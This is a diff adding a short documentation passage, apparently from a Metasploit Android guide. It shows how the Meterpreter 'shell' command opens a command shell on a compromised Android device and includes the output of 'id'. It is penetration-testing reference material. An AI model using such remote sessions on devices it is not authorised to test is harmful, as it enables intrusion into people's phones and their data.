@@ -1,0 +1,10 @@
+The shell command allows you to interact with a shell:
+
+meterpreter > shell
+
+Process 1 created.
+Channel 1 created.
+id
+uid=10231(u0_a231) gid=10231(u0_a231) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet),9997(everybody),50231(all_a231) context=u:r:untrusted_app:s0
+
+To get back to the Meterpreter prompt, you can do: [CTRL]+[Z]
